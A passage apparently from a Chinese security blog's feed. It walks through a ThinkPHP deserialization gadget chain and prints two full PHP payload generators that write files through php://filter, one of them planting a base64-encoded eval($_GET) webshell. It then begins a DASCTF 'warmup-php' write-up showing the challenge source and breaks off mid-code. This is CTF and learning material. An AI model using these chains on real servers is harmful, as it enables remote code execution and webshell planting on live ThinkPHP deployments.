<p>接下来就是用的__call方法进行rce了,他调用了black方法，我们跟进</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220601153134.png"></p>
<p>继续跟进writeln方法</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220601153238.png"></p>
<p>继续跟进</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220601153307.png"></p>
<p>handle可控，找可以rce的write方法</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220601153526.png"></p>
<p>找set方法</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220601170537.png"></p>
<p>我们可以写文件，如果data是可控的，我们就能rce，我们先跟进filename发现是getCacheKey赋值的，我们跟进getCacheKey</p>
<p><img src="/.com//Users\rangaork\AppData\Roaming\Typora\typora-user-images\image-20220601171357977.png" alt="image-20220601171357977"></p>
<p>发现后缀是写死的，但是无所谓反正也是php，我们看看data是不是可控</p>
<p>发现data是由wtite的第二参数决定的，但是</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220601172811.png"></p>
<p>被写死了，我们不能用</p>
<p>但是</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220601172914.png"></p>
<p>我们跟进settagitem方法</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220601172955.png"></p>
<p>发现又调用了一次set这次data可控</p>
<p>所以payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>\<span class="title">Pivot</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files[] = <span class="keyword">new</span> Pivot();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parent</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;append = [</span><br><span class="line">                <span class="string">&#x27;ky&#x27;</span> =&gt; <span class="string">&#x27;getError&#x27;</span></span><br><span class="line">            ];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = <span class="keyword">new</span> HasOne();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="keyword">new</span> Output();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">HasOne</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;selfRelation = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Query();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindAttr = [</span><br><span class="line">                <span class="string">&#x27;ky&#x27;</span> =&gt; <span class="string">&#x27;is a boy&#x27;</span></span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Query</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;model = <span class="keyword">new</span> Output();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;styles = [</span><br><span class="line">                <span class="string">&#x27;ky&#x27;</span> =&gt; <span class="string">&#x27;getAttr&#x27;</span></span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span>  = [</span><br><span class="line">            <span class="string">&#x27;host&#x27;</span>         =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="comment">// memcache主机</span></span><br><span class="line">            <span class="string">&#x27;port&#x27;</span>         =&gt; <span class="number">11211</span>, <span class="comment">// memcache端口</span></span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span>       =&gt; <span class="number">3600</span>, <span class="comment">// session有效期</span></span><br><span class="line">            <span class="string">&#x27;timeout&#x27;</span>      =&gt; <span class="number">0</span>, <span class="comment">// 连接超时时间（单位：毫秒）</span></span><br><span class="line">            <span class="string">&#x27;session_name&#x27;</span> =&gt; <span class="string">&#x27;ky&#x27;</span>, <span class="comment">// memcache key前缀</span></span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>     =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">//账号</span></span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>     =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">//密码</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> File();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">File</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">options</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=string.rot13/resource=./static/&lt;?cuc cucvasb();?&gt;&quot;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span>        =&gt; <span class="number">0</span></span><br><span class="line">            ];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="string">&#x27;ky&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line">&#125;<span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> \think\model\Merge];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Merge</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [</span><br><span class="line">            <span class="string">&#x27;bb&#x27;</span> =&gt; <span class="string">&#x27;getError&#x27;</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error = (<span class="keyword">new</span> \think\model\relation\BelongsTo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$styles</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;removeWhereField&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = (<span class="keyword">new</span> \think\session\driver\Memcache);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BelongsTo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;query = (<span class="keyword">new</span> \think\console\Output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler = (<span class="keyword">new</span> \think\cache\driver\Memcached);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span>        =&gt; <span class="number">3600</span>,</span><br><span class="line">            <span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>          =&gt; <span class="string">&#x27;php://filter/convert.base64-decode/resource=./&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span>   =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;prefix&#x27;</span>   =&gt; <span class="string">&#x27;PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler = (<span class="keyword">new</span> File);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> \think\process\pipes\Windows));</span><br></pre></td></tr></table></figure>

<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2022/05/11/5-11/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2022DASCTF-Apr-X-FATE复现"><a href="#2022DASCTF-Apr-X-FATE复现" class="headerlink" title="2022DASCTF Apr X FATE复现"></a>2022DASCTF Apr X FATE复现</h1><h2 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h2><p>一到反序列化的题目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;./class/&quot;</span>.<span class="variable">$class</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">            <span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$object</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Action(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php会新建一个类，类名我们可控，但是该类中需要有run方法，并且我们还可以传入一个数组给类中的属性赋值，接下来看看class文件</p>
<p>filter.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Filter</span> <span class="keyword">extends</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lastModified</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lastModifiedExpression</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$etagSeed</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$etagSeedExpression</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cacheControl</span>=<span class="string">&#x27;max-age=3600, public&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">preFilter</span>(<span class="params"><span class="variable">$filterChain</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$lastModified</span>=<span class="keyword">$this</span>-&gt;getLastModifiedValue();</span><br><span class="line">        <span class="variable">$etag</span>=<span class="keyword">$this</span>-&gt;getEtagValue();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$etag</span>===<span class="literal">false</span>&amp;&amp;<span class="variable">$lastModified</span>===<span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$etag</span>)</span><br><span class="line">            header(<span class="string">&#x27;ETag: &#x27;</span>.<span class="variable">$etag</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_IF_MODIFIED_SINCE&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_IF_NONE_MATCH&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checkLastModified(<span class="variable">$lastModified</span>)&amp;&amp;<span class="keyword">$this</span>-&gt;checkEtag(<span class="variable">$etag</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;send304Header();</span><br><span class="line">                <span class="keyword">$this</span>-&gt;sendCacheControlHeader();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_IF_MODIFIED_SINCE&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checkLastModified(<span class="variable">$lastModified</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;send304Header();</span><br><span class="line">                <span class="keyword">$this</span>-&gt;sendCacheControlHeader();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_IF_NONE_MATCH&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checkEtag(<span class="variable">$etag</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;send304Header();</span><br><span class="line">                <span class="keyword">$this</span>-&gt;sendCacheControlHeader();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$lastModified</span>)</span><br><span class="line">            header(<span class="string">&#x27;Last-Modified: &#x27;</span>.gmdate(<span class="string">&#x27;D, d M Y H:i:s&#x27;</span>, <span class="variable">$lastModified</span>).<span class="string">&#x27; GMT&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;sendCacheControlHeader();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getLastModifiedValue</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;lastModifiedExpression)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$value</span>=<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;lastModifiedExpression);</span><br><span class="line">            <span class="keyword">if</span>(is_numeric(<span class="variable">$value</span>)&amp;&amp;<span class="variable">$value</span>==(<span class="keyword">int</span>)<span class="variable">$value</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">            <span class="keyword">elseif</span>((<span class="variable">$lastModified</span>=strtotime(<span class="variable">$value</span>))===<span class="literal">false</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$lastModified</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;lastModified)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(is_numeric(<span class="keyword">$this</span>-&gt;lastModified)&amp;&amp;<span class="keyword">$this</span>-&gt;lastModified==(<span class="keyword">int</span>)<span class="keyword">$this</span>-&gt;lastModified)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;lastModified;</span><br><span class="line">            <span class="keyword">elseif</span>((<span class="variable">$lastModified</span>=strtotime(<span class="keyword">$this</span>-&gt;lastModified))===<span class="literal">false</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$lastModified</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getEtagValue</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;etagSeedExpression)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;generateEtag(<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;etagSeedExpression));</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="keyword">$this</span>-&gt;etagSeed)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;generateEtag(<span class="keyword">$this</span>-&gt;etagSeed);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkEtag</span>(<span class="params"><span class="variable">$etag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_IF_NONE_MATCH&#x27;</span>])&amp;&amp;<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_IF_NONE_MATCH&#x27;</span>]==<span class="variable">$etag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkLastModified</span>(<span class="params"><span class="variable">$lastModified</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_IF_MODIFIED_SINCE&#x27;</span>])&amp;&amp;@strtotime(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_IF_MODIFIED_SINCE&#x27;</span>])&gt;=<span class="variable">$lastModified</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">send304Header</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        header(<span class="string">&#x27;HTTP/1.1 304 Not Modified&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateEtag</span>(<span class="params"><span class="variable">$seed</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&quot;&#x27;</span>.base64_encode(sha1(serialize(<span class="variable">$seed</span>),<span class="literal">true</span>)).<span 